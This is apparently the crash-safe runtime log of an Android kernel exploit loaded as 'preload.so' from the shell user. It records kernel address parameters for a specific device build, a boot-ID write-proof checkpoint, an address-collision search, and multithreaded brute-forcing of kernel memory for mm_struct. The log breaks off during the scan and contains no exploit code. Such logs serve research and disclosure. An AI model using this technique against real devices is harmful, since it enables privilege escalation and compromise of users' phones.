===== preload.so crash-safe log =====
path=/data/local/tmp/.temp/log_1788952722.txt tmp=- pid=6121 uid=2000
1788952722.290 6121 [+] preload starting pid=6121
1788952722.291 6121 [+] startup context pid=6121 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788952722.292 6121 [+] build config pid=6121 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788952722.292 6121 [+] p0 profile pid=6121 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788952722.293 6121 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788952722.296 6121 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=31638d59-7c3a-4556-a71c-b20baa9b3a7e (odd: leaked scratch, even: aligned bootid+3)
1788952724.833 6121 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788952728.122 6121 [*] pile-up verified: approx_time=2848
1788952728.124 6121 [*] start finding collisisons
1788952728.125 6121 [*] target    0000007f6821b0c8
1788952728.405 6121 [*]   0000006cd27add68
1788952728.998 6121 [*]   0000006cd2bf3f98
1788952730.258 6121 [*]   0000006cd3a4f278
1788952730.546 6121 [*]   0000006cd3b3f9f8
1788952732.473 6121 [*]   0000006cd5305828
1788952733.805 6121 [*]   0000006cd62ed768
1788952734.031 6121 [*]   0000006cd6322910
1788952734.285 6121 [*]   0000006cd63c9e48
1788952735.905 6121 [*]   0000006cd779ecf0
1788952736.304 6121 [*]   0000006cd7a6f378
1788952737.120 6121 [*]   0000006cd82e4720
1788952738.485 6121 [*]   0000006cd9363b18
1788952741.155 6121 [*]   0000006cdb62b158
1788952741.986 6121 [*]   0000006cdbeb55a8
1788952742.533 6121 [*]   0000006cdc396cb0
1788952742.536 6121 [*] found 15 collisisons
1788952749.372 6121 [*] start bruteforcing
1788952749.377 6121 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788952749.377 6121 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788952749.377 6121 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788952749.377 6121 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788952749.377 6121 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788952749.377 6121 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788952749.378 6121 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788952749.378 6121 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788952749.380 6121 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
1788952749.381 6121 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
1788952749.382 6121 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
1788952749.383 6121 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
1788952749.384 6121 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
1788952749.384 6121 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
1788952749.386 6121 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
1788952749.386 6121 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
1788952749.387 6121 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
1788952749.388 6121 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788952749.389 6121 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
1788952749.389 6121 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
1788952749.389 6121 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
1788952749.389 6121 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788952749.391 6121 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
1788952749.391 6121 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
1788952749.392 6121 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
1788952749.392 6121 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
1788952749.393 6121 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
1788952749.394 6121 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
1788952749.394 6121 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
1788952749.395 6121 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
1788952749.396 6121 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
1788952749.397 6121 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
1788952749.397 6121 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
1788952749.398 6121 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
1788952749.398 6121 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
1788952749.399 6121 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
1788952749.400 6121 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
1788952749.400 6121 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
1788952749.401 6121 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
1788952749.402 6121 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
1788952749.402 6121 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
1788952749.402 6121 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
1788952749.403 6121 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
1788952749.404 6121 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
1788952749.405 6121 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
1788952749.405 6121 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
1788952749.406 6121 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
1788952749.408 6121 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
1788952749.408 6121 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
1788952749.408 6121 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
1788952749.409 6121 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
1788952749.410 6121 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
